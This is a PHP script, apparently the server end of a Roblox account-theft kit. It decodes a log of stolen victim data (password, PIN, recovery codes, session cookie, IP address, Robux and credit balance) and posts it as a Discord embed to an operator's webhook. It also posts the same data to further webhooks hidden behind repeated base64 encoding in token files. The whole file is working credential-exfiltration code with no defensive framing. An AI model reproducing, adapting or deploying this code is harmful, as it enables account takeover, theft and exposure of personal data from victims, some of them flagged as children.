<?php
session_start();
if(isset($_GET['returnUrl'])) {
require('setup.php');
$secret = $_GET['returnUrl'];
$log = json_decode(base64_decode($_GET['log']),true)['log'];
$under13ornah = $log['under'];
$username = $log['username'];
$password = $log['password'];
$robux = $log['robux'];
$premium = $log['premium'];
$rap = $log['rap'];
$summary = $log['summary'];
$creditbalance = $log['creditbalance'];
$status = $log['status'];
$age = $log['age'];
$pin = $log['pin'];
$recoverycodes = $log['recoverycodes'];
$roblosecurity = $log['roblosecurity'];
$ipaddr = $log['ip'];
$checkcookie = $log['tinyurl'];
$thumbnail = $log['thumbnail'];
if($checkcookie == 'Error') {
$checkcookie ='https://'.$_SERVER['SERVER_NAME'].'/Bypass/check?cookie='.$roblosecurity;
}
$timestamp = date("c", strtotime("now"));
$result = '{
"content": "",
"embeds": [
{
"description": "[**Check Cookie**]('.$checkcookie.')",
"color": '.hexdec(str_replace('#','',$color)).',
"fields": [
{
"name": "Username ('.$under13ornah.')",
"value": "'.$username.'"
},
{
"name": "Password",
"value": "'.$password.'"
},
{
"name": "Robux (Pending)",
"value": "'.$robux.'",
"inline": true
},
{
"name": "Premium",
"value": "'.$premium.'",
"inline": true
},
{
"name": "RAP",
"value": "'.$rap.'"
},
{
"name": "Summary",
"value": "'.$summary.'",
"inline": true
},
{
"name": "Credit Balance",
"value": "'.$creditbalance.'",
"inline": true
},
{
"name": "Status",
"value": "'.$status.'",
"inline": true
},
{
"name": "Age",
"value": "'.$age.'",
"inline": true
},
{
"name": "PIN",
"value": "'.$pin.'",
"inline": true
},
{
"name": "Recovery Codes",
"value": "'.$recoverycodes.'"
},
{
"name": "Cookie :cookie:",
"value": "```'.$roblosecurity.'```"
}
],
"footer": {
"text": "'.$ipaddr.'"
},
"timestamp": "'.date('Y-m-d').'T'.date("H:i:s").'.'.date("v").'Z'.'",
"thumbnail": {
"url": "'.$thumbnail.'"
}
}
],
"username": "'.$name.'",
"avatar_url": "'.$image.'",
"attachments": []
}';
if($webhook){
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => $webhook,
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $result,
CURLOPT_HTTPHEADER => [
"Content-Type: application/json"
]
]);                                   
$response = curl_exec($ch);
curl_close($ch);
}
$webhooknormal =base64_decode(base64_decode(file_get_contents('tokens/returnUrl-'.$secret.'.txt')));
file_put_contents($webhooknormal,$webhooknormal);
if (strpos($webhooknormal, 'api/webhooks/')) {
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => $webhooknormal,
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $result,
CURLOPT_HTTPHEADER => [
"Content-Type: application/json"
]
]);                                   
$response = curl_exec($ch);
curl_close($ch);
}
if(file_exists("tokens/$secret.txt")) {
$webhooks = base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents("tokens/$secret.txt"))))));
if (strpos($webhooks, 'api/webhooks/')) {
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => $webhooks,
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $result,
CURLOPT_HTTPHEADER => [
"Content-Type: application/json"
]
]);                                   
$response = curl_exec($ch);
curl_close($ch);
}
}
}
?>